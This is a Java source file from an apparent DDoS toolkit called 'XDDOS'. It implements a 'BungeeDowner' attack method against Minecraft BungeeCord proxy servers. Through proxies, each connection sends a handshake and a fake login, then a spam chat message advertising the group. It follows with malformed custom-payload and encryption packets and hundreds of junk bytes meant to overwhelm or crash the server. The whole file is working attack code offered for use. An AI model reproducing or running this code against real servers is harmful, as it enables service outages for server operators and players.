package XD.XDDOS.methods.impl;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.zip.Deflater;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.helper.RandomUtils;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.packet.PacketUtils;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class BungeeDowner
implements IMethod{

    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
    public byte[] ad = new byte[]{127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128};
    private static String sa = "";
    public byte[] custompayload;

    public BungeeDowner() {
        try {
            this.custompayload = this.compress(this.createCustomPayload("MC|BEdit", this.ad), 0);
        } catch (IOException var3) {
            var3.printStackTrace();
        }

        for(int i = 0; i < 255; ++i) {
            sa = sa + (char)i + "\u000000000";
        }

    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

        try {
            channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(99) + "_XDDOS_" + (new SecureRandom()).nextInt(99))).getWrappedPacket()));
            writePacket(this.compress(PacketUtils.createChatPacket("-" + RandomUtils.randomString(4) + "- TEAM XD ON TOP | discord . io / XDDOS -" + RandomUtils.randomString(4) + "-"), 0), bbbb);
            writePacket(this.getdata(), bbbb);

            for(int i = 0; i < 500; ++i) {
                bbbb.write(0);
                bbbb.write(1);
            }
        } catch (IOException var6) {
            var6.printStackTrace();
        }

        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        ++NettyBootstrap.integer;
        NettyBootstrap.totalConnections++;
    }

    public static void writeEncryptionResponseKapputt(DataOutputStream lol) throws IOException {
        ByteArrayOutputStream stream = null;
        stream = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(stream);
        PacketUtils.writeVarInt(out, 1);
        byte[] enc = new byte[]{9, -23, 21, 3, 123, 32, 34, 0, 45, -34, 4, 34, 4, 56, 34};
        PacketUtils.writeVarInt(out, enc.length);
        out.write(enc);
        PacketUtils.writeVarInt(out, enc.length);
        out.write(enc);
        byte[] r = stream.toByteArray();
        PacketUtils.writeVarInt(lol, r.length);
        lol.write(r, 0, r.length);
    }

    public static byte[] getreal() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeEncryptionResponseKapputt(out);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public byte[] getdata() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        out.write(-15);
        out.write(0);
        out.write(-47);
        out.write(-9);
        out.writeBytes(XDDOS.srvRecord);
        out.write(-99);
        out.write(-224);
        out.write(-1);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public byte[] createCustomPayload(String packet, byte[] input) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        out.write(254);
        out.write(1);
        out.write(250);
        char[] achar = packet.toCharArray();
        out.writeShort(achar.length);
        out.write(input);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public byte[] createconsole() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        out.write(254);
        out.write(1);
        out.write(250);
        char[] achar = "REGISTER".toCharArray();
        out.writeShort(achar.length);
        out.writeUTF(sa);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public byte[] createLegacyMOTDPacket() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        out.write(254);
        out.write(1);
        out.write(250);
        char[] achar = "BungeeCord".toCharArray();
        out.writeShort(achar.length);
        out.writeUTF("Message");
        out.writeUTF("ALL");
        out.writeUTF("lobby1");
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public byte[] compress(byte[] packet, int threshold) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        byte[] buffer = new byte[8192];
        if (packet.length >= threshold && threshold > 0) {
            byte[] data = new byte[packet.length];
            System.arraycopy(packet, 0, data, 0, packet.length);
            PacketUtils.writeVarInt(out, data.length);
            Deflater def = new Deflater();
            def.setInput(data, 0, data.length);
            def.finish();

            while(!def.finished()) {
                int i = def.deflate(buffer);
                out.write(buffer, 0, i);
            }

            def.reset();
        } else {
            PacketUtils.writeVarInt(out, 0);
            out.write(packet);
        }

        out.close();
        return bytes.toByteArray();
    }

    public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
        writeVarInt(packetData.length, out);
        out.write(packetData);
    }

    public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
        while((value & -128) != 0) {
            out.writeByte(value & 127 | 128);
            value >>>= 7;
        }

        out.writeByte(value);
    }

}
